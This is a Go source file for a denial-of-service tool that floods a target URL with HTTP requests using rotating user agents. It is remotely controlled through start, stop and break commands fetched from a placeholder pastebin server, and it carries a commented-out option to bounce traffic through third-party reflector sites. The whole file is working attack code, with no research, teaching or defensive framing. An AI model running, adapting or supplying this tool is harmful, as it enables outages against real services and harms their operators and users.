package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/fatih/color"
)

var userAgents = [...]string{
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
	"Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00",
	"PostmanRuntime/7.26.5",
	"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:94.0) Gecko/20100101 Firefox/94.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/39.0 Mobile/15E148 Safari/605.1.15",
}
var urls = [...]string{
	"https://validator.w3.org/nu/?doc=",
	"http://www.facebook.com/sharer/sharer.php?u=",
	"https://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=",
	"http://www.w3.org/RDF/Validator/ARPServlet?URI=",
}
var counter = 0
var mu sync.Mutex
var running = false

func Hammer(host string, q chan bool) {
	for {
		select {
		case <-q:
			mu.Lock()
			running = false
			mu.Unlock()
			return
		default:
			_, err := http.Get(host)
			if err != nil {
				fmt.Println(err)
			}
			color.Green("[+] Hammering url --> " + host)
			mu.Lock()
			counter += 1
			running = true
			color.Yellow("Number of requests sent --> %d", counter)
			mu.Unlock()

		}
	}

}

func DoubleHammer(host string, q chan bool) {
	for {
		select {
		case <-q:
			mu.Lock()
			running = false
			mu.Unlock()
			return
		default:
			//uncomment
			//req, _ := http.NewRequest("GET", urls[rand.Intn(len(urls))]+host, nil)
			req, _ := http.NewRequest("GET", host, nil)
			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
			client := &http.Client{}
			_, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
			}
			color.Green("[+] Double hammering url --> " + host)
			mu.Lock()
			counter += 1
			running = true
			color.Yellow("Number of requests sent --> %d", counter)
			mu.Unlock()

		}
	}
}
func main() {
	server := os.Args[1]
	q := make(chan bool)
	color.Blue("[+] Starting DOS...")

	for {
		time.Sleep(3 * time.Second)
		res, err := http.Get("<PASTEBIN-SERVER>")
		if err != nil {
			fmt.Println(err)
		}
		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			fmt.Println(err)
		}
		com := string(body)
		if com == "stop" && !running {
			color.Red("[-] Hammering stopped..")
			res.Body.Close()
			time.Sleep(5 * time.Second)
		} else if com == "stop" && running {
			color.Red("[-] Stopping threads..")
			q <- true
		} else if com == "start" && !running {
			time.Sleep(2 * time.Second)
			go Hammer(server, q)
			res.Body.Close()
		} else if com == "start" && running {
			res.Body.Close()
			continue
		} else if com == "break" && !running {
			time.Sleep(2 * time.Second)
			go Hammer(server, q)
			go DoubleHammer(server, q)
			res.Body.Close()
		} else if com == "break" && running {
			res.Body.Close()
			continue
		}

	}

}
